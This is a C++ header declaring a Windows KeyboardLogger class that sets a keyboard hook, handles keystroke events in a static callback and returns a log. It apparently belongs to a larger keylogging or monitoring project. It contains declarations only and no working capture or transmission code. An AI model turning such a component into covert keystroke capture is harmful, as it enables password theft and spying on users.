#ifndef KEYBOARDLOGGER_HPP_
#define KEYBOARDLOGGER_HPP_

#include <Windows.h>
#include "ALogger.hpp"
#include "DataLogger.hpp"

class LoggerHandler;


class KeyboardLogger : public ALogger
{
public:
	KeyboardLogger();
	KeyboardLogger(LoggerHandler *handler);
	~KeyboardLogger();

	static LRESULT CALLBACK keyboardEventProcCallback(int nCode, WPARAM wParam, LPARAM lParam);

	bool			start();
	void			stop()const;
	std::string		getLog();
	static LoggerHandler	*_handler;

private:
	HHOOK					_keyboardHook;
	static std::string		_flag;
};

#endif /* !KEYBOARDLOGGER_HPP_ */
